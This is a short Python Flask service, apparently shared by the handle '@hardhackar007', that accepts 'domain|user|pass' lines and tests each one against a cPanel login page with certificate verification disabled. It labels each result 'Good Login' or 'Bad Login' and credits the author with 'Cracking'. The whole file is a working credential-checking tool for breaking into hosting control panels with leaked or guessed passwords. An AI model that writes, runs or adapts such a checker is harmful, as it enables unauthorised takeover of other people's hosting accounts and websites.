from flask import Flask, request, jsonify
import requests
import urllib3

# Suppress HTTPS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route("/", methods=["GET"])
def check_cp_login():
    account_line = request.args.get("account")
    if not account_line or "|" not in account_line or len(account_line.split("|")) != 3:
        return jsonify({
            "credit": "API OWNER BY: @hardhackar007",
            "status": "error",
            "message": "Invalid 'account' format. Use http://domain:2083|user|pass"
        }), 400

    try:
        domain, username, password = account_line.strip().split("|")
        url = domain.replace("http://", "https://").replace(":2082", ":2083") + "/login/?login_only=1"
        payload = {"user": username, "pass": password}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

        response = requests.post(
            url,
            data=payload,
            headers=headers,
            timeout=15,
            verify=False,
            allow_redirects=False
        )

        if "security_token" in response.text or "redirect" in response.text.lower():
            return jsonify({
                "credit": "API OWNER BY: @hardhackar007",
                "status": "success",
                "result": f"{domain}|{username}|{password} --> Cracking by: @hardhackar007 --> Good Login"
            })
        else:
            return jsonify({
                "credit": "API OWNER BY: @hardhackar007",
                "status": "fail",
                "result": f"{domain}|{username}|{password} --> Bad Login"
            })

    except Exception as e:
        return jsonify({
            "credit": "API OWNER BY: @hardhackar007",
            "status": "error",
            "message": str(e)[:100]
        }), 500
